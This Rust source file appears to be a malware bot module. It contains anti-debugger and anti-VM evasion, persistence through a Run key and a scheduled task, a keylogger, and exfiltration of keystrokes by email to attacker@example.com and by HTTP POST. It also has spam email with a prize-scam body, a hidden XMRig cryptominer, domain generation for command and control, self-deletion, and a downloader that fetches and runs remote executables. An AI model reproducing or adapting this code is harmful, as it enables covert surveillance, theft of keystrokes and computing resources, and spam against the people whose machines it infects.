use std::error::Error;
use tokio::time::sleep;
use std::time::Duration;
use lettre::{Message, AsyncTransport, Tokio1Executor, AsyncSmtpTransport};
use lettre::message::header::ContentType;
use lettre::transport::smtp::authentication::Credentials;
use tokio::net::TcpListener;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use rdev::{listen, Event, EventType};
use chrono::{Datelike, Utc};
use rand::{Rng, SeedableRng, rngs::StdRng};
use base64::{Engine, engine::general_purpose};
use sha3::{Digest, Sha3_256};
use crate::config::{CONFIG, KEYLOGS};

#[cfg(windows)]
extern "system" {
    fn GetConsoleWindow() -> *mut std::ffi::c_void;
    fn ShowWindow(hwnd: *mut std::ffi::c_void, nCmdShow: i32) -> i32;
    fn IsDebuggerPresent() -> i32;
}

const SW_HIDE: i32 = 0;

pub fn check_debugger() -> bool {
    #[cfg(windows)]
    unsafe {
        IsDebuggerPresent() != 0
    }
    #[cfg(not(windows))]
    false
}

pub fn hide_console() {
    #[cfg(windows)]
    unsafe {
        let hwnd = GetConsoleWindow();
        if !hwnd.is_null() {
            ShowWindow(hwnd, SW_HIDE);
        }
    }
}

pub async fn check_anti_vm() -> bool {
    let mut system = sysinfo::System::new_all();
    system.refresh_all();
    
    // Process checks
    for process in system.processes().values() {
        let name = process.name().to_string().to_lowercase();
        if name.contains("vmware") || name.contains("virtualbox") || name.contains("vbox") {
            return true;
        }
    }
    
    // Registry checks
    #[cfg(windows)]
    {
        use winreg::RegKey;
        let hklm = RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE);
        if hklm.open_subkey("SOFTWARE\\VMware, Inc.\\VMware Tools").is_ok() ||
           hklm.open_subkey("SOFTWARE\\Oracle\\VirtualBox Guest Additions").is_ok() {
            return true;
        }
    }
    
    // File checks
    #[cfg(windows)]
    {
        use std::path::Path;
        if Path::new(r"C:\Windows\System32\vmGuestLib.dll").exists() ||
           Path::new(r"C:\Windows\System32\VBoxGuest.sys").exists() ||
           Path::new(r"C:\Windows\System32\vm3dgl.dll").exists() ||
           Path::new(r"C:\Windows\System32\VBoxHook.dll").exists() {
            return true;
        }
    }
    
    // MAC address check
    if let Ok(mac) = mac_address::get_mac_address() {
        if let Some(mac) = mac {
            let bytes = mac.bytes();
            // Common VM MAC prefixes
            let vm_prefixes = [
                [0x08, 0x00, 0x27], // VirtualBox
                [0x00, 0x05, 0x69], // VMware
                [0x00, 0x0C, 0x29], // VMware
                [0x00, 0x1C, 0x14], // VMware
                [0x00, 0x50, 0x56], // VMware
            ];
            for prefix in &vm_prefixes {
                if bytes[0..3] == *prefix {
                    return true;
                }
            }
        }
    }
    
    // CPU name check
    for cpu in system.cpus() {
        let brand = cpu.brand().to_lowercase();
        if brand.contains("qemu") || brand.contains("virtual") || brand.contains("kvm") {
            return true;
        }
    }
    
    // RAM size check (less than 2GB might indicate VM)
    let total_memory = system.total_memory();
    if total_memory < 2 * 1024 * 1024 * 1024 { // 2GB
        return true;
    }
    
    false
}

pub async fn persistence() {
    #[cfg(windows)]
    {
        use winreg::enums::*;
        use winreg::RegKey;
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let path = std::env::current_exe().unwrap();
        let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").unwrap();
        key.set_value("SystemUpdate", &path.to_str().unwrap()).ok();

        // Advanced: Scheduled Task for persistence
        let task_name = "WindowsSystemUpdateTask";
        let exe_path = path.to_str().unwrap();
        let cmd = format!(
            "schtasks /create /tn \"{}\" /tr \"'{}'\" /sc onlogon /rl highest /f",
            task_name, exe_path
        );
        std::process::Command::new("cmd")
            .args(&["/c", &cmd])
            .spawn()
            .ok();
    }
}

pub async fn start_socks5_proxy(port: u16) {
    let listener = TcpListener::bind(("0.0.0.0", port)).await.unwrap();
    println!("TCP Proxy (SOCKS5 placeholder) running on port {}", port);

    loop {
        let (mut stream, _) = listener.accept().await.unwrap();
        tokio::spawn(async move {
            // Simple echo for demonstration; full SOCKS5 implementation would require protocol parsing
            let mut buf = [0u8; 1024];
            loop {
                match stream.read(&mut buf).await {
                    Ok(0) => break,
                    Ok(n) => {
                        // Echo back
                        let _ = stream.write_all(&buf[..n]).await;
                    }
                    Err(_) => break,
                }
            }
        });
    }
}

pub async fn spam_email(target: String, count: u32) -> Result<(), Box<dyn Error + Send + Sync>> {
    let config = {
        let guard = CONFIG.lock().unwrap();
        guard.as_ref().unwrap().clone()
    };
    let creds = Credentials::new(config.smtp_user.clone(), config.smtp_pass.clone());
    let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(&config.smtp_server)?
        .credentials(creds)
        .build();

    let email = Message::builder()
        .from(config.smtp_user.parse()?)
        .to(target.parse()?)
        .subject("Important Notification")
        .header(ContentType::TEXT_PLAIN)
        .body("You won $1,000,000! Click here...".to_string())?;

    for _ in 0..count {
        let _ = mailer.send(email.clone()).await;
        sleep(Duration::from_millis(500)).await; // avoid rate limit
    }
    Ok(())
}

pub async fn start_mining() {
    let config = {
        let guard = CONFIG.lock().unwrap();
        guard.as_ref().unwrap().clone()
    };
    // Placeholder: Replace with actual base64 encoded XMRig binary
    const BASE64_XMRIG: &str = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."; // truncated
    let xmrig_bytes = general_purpose::STANDARD.decode(BASE64_XMRIG).unwrap_or_default();
    if xmrig_bytes.is_empty() {
        println!("XMRig binary not embedded, falling back to CPU mining");
        // Fallback to CPU mining
        let difficulty = 4;
        loop {
            let input = rand::random::<[u8; 32]>();
            let mut nonce = 0u64;
            loop {
                let mut hasher = Sha3_256::new();
                hasher.update(&input);
                hasher.update(&nonce.to_le_bytes());
                let hash = hasher.finalize();
                let mut is_valid = true;
                for i in 0..difficulty {
                    if hash[i] != 0 {
                        is_valid = false;
                        break;
                    }
                }
                if is_valid {
                    println!("Block mined! Nonce: {}", nonce);
                    break;
                }
                nonce += 1;
                if nonce % 100000 == 0 {
                    println!("Mining... Nonce: {}", nonce);
                }
            }
            sleep(Duration::from_millis(10)).await;
        }
    } else {
        // Write to temp file and run
        let temp_path = std::env::temp_dir().join("xmrig.exe");
        tokio::fs::write(&temp_path, xmrig_bytes).await.unwrap();
        
        // Run XMRig with pool and wallet
        let args = vec![
            "--url".to_string(), config.pool_url.clone(),
            "--user".to_string(), config.wallet.clone(),
            "--pass".to_string(), "x".to_string(),
            "--donate-level".to_string(), "0".to_string(), // No donation
            "--background".to_string(), // Run in background
        ];
        
        tokio::process::Command::new(&temp_path)
            .args(&args)
            .spawn()
            .unwrap();
        
        println!("XMRig started mining to pool: {}", config.pool_url);
    }
}

pub fn start_keylogger() {
    std::thread::spawn(|| {
        let callback = |event: Event| {
            if let EventType::KeyPress(key) = event.event_type {
                if let Ok(mut logs) = KEYLOGS.lock() {
                    logs.push_str(&format!("{:?} ", key));
                }
            }
        };
        if let Err(e) = listen(callback) {
            eprintln!("Keylogger error: {:?}", e);
        }
    });
}

pub async fn exfil_keylogs() -> Result<(), Box<dyn Error + Send + Sync>> {
    let logs = tokio::task::spawn_blocking(|| {
        KEYLOGS.lock().unwrap().clone()
    }).await.unwrap();
    let config = {
        let guard = CONFIG.lock().unwrap();
        guard.as_ref().unwrap().clone()
    };
    if !logs.is_empty() {
        let creds = Credentials::new(config.smtp_user.clone(), config.smtp_pass.clone());
        let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(&config.smtp_server)?
            .credentials(creds)
            .build();
        let email = Message::builder()
            .from(config.smtp_user.parse()?)
            .to("attacker@example.com".parse()?)
            .subject("Keylogs")
            .header(ContentType::TEXT_PLAIN)
            .body(logs)?;
        mailer.send(email).await?;
        tokio::task::spawn_blocking(|| {
            KEYLOGS.lock().unwrap().clear();
        }).await.unwrap();
    }
    Ok(())
}

pub async fn exfil_http() -> Result<(), Box<dyn Error + Send + Sync>> {
    let logs = tokio::task::spawn_blocking(|| {
        KEYLOGS.lock().unwrap().clone()
    }).await.unwrap();
    let config = {
        let guard = CONFIG.lock().unwrap();
        guard.as_ref().unwrap().clone()
    };
    if !logs.is_empty() {
        let encoded = general_purpose::STANDARD.encode(&logs);
        let client = reqwest::Client::new();
        let res = client.post(&config.exfil_url)
            .header("Content-Type", "application/json")
            .body(format!("{{\"data\":\"{}\"}}", encoded))
            .send()
            .await?;
        if res.status().is_success() {
            tokio::task::spawn_blocking(|| {
                KEYLOGS.lock().unwrap().clear();
            }).await.unwrap();
        }
    }
    Ok(())
}

pub fn generate_dga_domains() -> Vec<String> {
    let mut domains = Vec::new();
    let date = Utc::now().date_naive();
    let seed_str = format!("{}{}{}", date.year(), date.month(), date.day());
    let seed_bytes = seed_str.as_bytes();
    let mut seed = [0u8; 32];
    for (i, &b) in seed_bytes.iter().enumerate() {
        if i < 32 {
            seed[i] = b;
        }
    }
    let mut rng = StdRng::from_seed(seed);
    for _ in 0..10 {
        let len = rng.gen_range(5..15);
        let domain: String = (0..len).map(|_| rng.sample(rand::distributions::Alphanumeric) as char).collect();
        domains.push(format!("{}.com", domain.to_lowercase()));
    }
    domains
}

pub async fn self_delete() {
    #[cfg(windows)]
    {
        let exe_path = std::env::current_exe().unwrap();
        let ps_command = format!("Remove-Item '{}' -Force", exe_path.display());
        std::process::Command::new("powershell")
            .arg("-Command")
            .arg(ps_command)
            .spawn()
            .ok();
        std::process::exit(0);
    }
}

pub async fn update_bot(url: String) -> Result<(), Box<dyn Error + Send + Sync>> {
    let response = reqwest::get(&url).await?;
    let new_exe = response.bytes().await?;
    
    let current_exe = std::env::current_exe()?;
    let temp_exe = current_exe.with_extension("new.exe");
    
    tokio::fs::write(&temp_exe, new_exe).await?;
    
    // Run the new exe and exit
    std::process::Command::new(&temp_exe).spawn()?;
    
    // Self delete old
    self_delete().await;
    
    Ok(())
}